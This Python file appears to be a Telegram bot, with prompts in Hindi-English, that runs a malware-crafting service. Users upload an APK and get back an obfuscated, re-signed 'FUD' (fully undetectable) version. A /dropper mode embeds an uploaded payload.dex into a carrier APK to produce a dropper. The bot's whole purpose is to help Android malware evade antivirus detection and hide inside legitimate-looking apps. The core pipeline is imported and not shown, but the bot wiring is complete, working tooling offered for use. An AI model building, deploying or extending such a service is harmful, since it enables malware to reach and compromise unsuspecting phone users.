import os
import asyncio
import uuid
import shutil
import threading
import traceback
from flask import Flask
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes,
)

from config import BOT_TOKEN, WORK_DIR
from __init__ import full_fud_pipeline, full_fud_pipeline_dropper, ensure_tools


# ================= Flask (health check for Render/Railway) =================
flask_app = Flask(__name__)


@flask_app.route("/")
def home():
    return "FUD Bot alive!", 200


def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, debug=False)


# ================= Telegram handlers =================
async def handle_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *FUD APK Bot*\n\n"
        "Modes:\n"
        "• APK bhejo → FUD APK milega (obfuscated + signed)\n"
        "• /dropper reply karke + DEX bhejo → dropper APK\n\n"
        "First run pe tools auto-download honge (2-5 min).",
        parse_mode="Markdown",
    )


async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    doc = msg.document if msg else None
    if not doc or not doc.file_name.endswith(".apk"):
        await msg.reply_text("❌ Sirf .apk file bhejo.")
        return

    session_id = str(uuid.uuid4())[:8]
    session_dir = os.path.join(WORK_DIR, session_id)
    os.makedirs(session_dir, exist_ok=True)
    input_path = os.path.join(session_dir, "input.apk")
    output_path = os.path.join(session_dir, "fud_output.apk")

    status = await msg.reply_text("⚙️ Processing shuru... (pehli baar tools download ho rahe hain, 2-5 min)")

    try:
        await status.edit_text("📥 APK download ho raha hai...")
        tg_file = await context.bot.get_file(doc.file_id)
        await tg_file.download_to_drive(input_path)

        await status.edit_text("🔧 Tools check ho rahe hain...")
        await asyncio.to_thread(ensure_tools)

        await status.edit_text("🧬 Obfuscating + repackaging...")
        await asyncio.to_thread(
            full_fud_pipeline, input_path, output_path, session_dir
        )

        await status.edit_text("📤 Uploading...")
        with open(output_path, "rb") as f:
            await msg.reply_document(document=f, filename="fud_ready.apk")
        await status.edit_text("✅ FUD APK ready!")
    except Exception as e:
        tb = traceback.format_exc()
        print(tb)
        await status.edit_text(f"❌ Error:\n`{str(e)[:300]}`", parse_mode="Markdown")
    finally:
        shutil.rmtree(session_dir, ignore_errors=True)


async def handle_dropper_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Reply to a previous /dropper request with an APK.
    Flow:
      1. User sends payload.dex with caption /dropper
      2. Bot stores dex path in context.user_data
      3. User sends carrier.apk → dropper built
    """
    msg = update.message
    doc = msg.document if msg else None
    if not doc:
        return

    fname = doc.file_name or ""
    session_id = str(uuid.uuid4())[:8]
    session_dir = os.path.join(WORK_DIR, session_id)
    os.makedirs(session_dir, exist_ok=True)

    try:
        tg_file = await context.bot.get_file(doc.file_id)

        if fname.endswith(".dex"):
            dst = os.path.join(WORK_DIR, "last_payload.dex")
            await tg_file.download_to_drive(dst)
            context.user_data["payload_dex"] = dst
            await msg.reply_text("✅ Payload DEX stored. Ab carrier APK bhejo.")
            return

        if fname.endswith(".apk"):
            payload = context.user_data.get("payload_dex")
            if not payload or not os.path.exists(payload):
                await msg.reply_text("❌ Pehle payload.dex bhejo (caption: /dropper).")
                return

            input_path = os.path.join(session_dir, "carrier.apk")
            output_path = os.path.join(session_dir, "dropper.apk")

            status = await msg.reply_text("⚙️ Dropper build ho raha hai...")
            await tg_file.download_to_drive(input_path)

            await status.edit_text("🔧 Tools check...")
            await asyncio.to_thread(ensure_tools)

            await status.edit_text("🧬 Building dropper...")
            await asyncio.to_thread(
                full_fud_pipeline_dropper,
                input_path, payload, output_path, session_dir,
            )

            with open(output_path, "rb") as f:
                await msg.reply_document(document=f, filename="dropper.apk")
            await status.edit_text("✅ Dropper ready!")
            return

        await msg.reply_text("❌ Sirf .apk ya .dex.")
    except Exception as e:
        tb = traceback.format_exc()
        print(tb)
        await msg.reply_text(f"❌ Error:\n`{str(e)[:300]}`", parse_mode="Markdown")
    finally:
        shutil.rmtree(session_dir, ignore_errors=True)


# ================= Bot bootstrap =================
async def run_bot():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", handle_start))
    app.add_handler(CommandHandler("dropper", handle_dropper_apk))
    app.add_handler(MessageHandler(
        filters.Document.FileExtension("apk") | filters.Document.FileExtension("dex"),
        handle_dropper_apk if False else handle_apk,  # default = FUD only
    ))
    # Dropper path via /dropper command separately
    app.add_handler(MessageHandler(
        filters.Document.ALL & filters.CaptionRegex(r"^/dropper"),
        handle_dropper_apk,
    ))

    await app.initialize()
    await app.start()
    await app.updater.start_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
    )
    print("🤖 Bot polling active.")
    await asyncio.Event().wait()


# ================= Entry =================
def main():
    os.makedirs(WORK_DIR, exist_ok=True)

    # Background: kick off tool setup immediately at boot
    def _boot_setup():
        try:
            ensure_tools()
            print("[✓] boot setup complete")
        except Exception:
            traceback.print_exc()

    threading.Thread(target=_boot_setup, daemon=True).start()

    # Flask for cloud health checks
    threading.Thread(target=run_flask, daemon=True).start()
    print("[✓] Flask started.")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(run_bot())
    except KeyboardInterrupt:
        print("🛑 Stopped.")
    finally:
        loop.close()


if __name__ == "__main__":
    main()
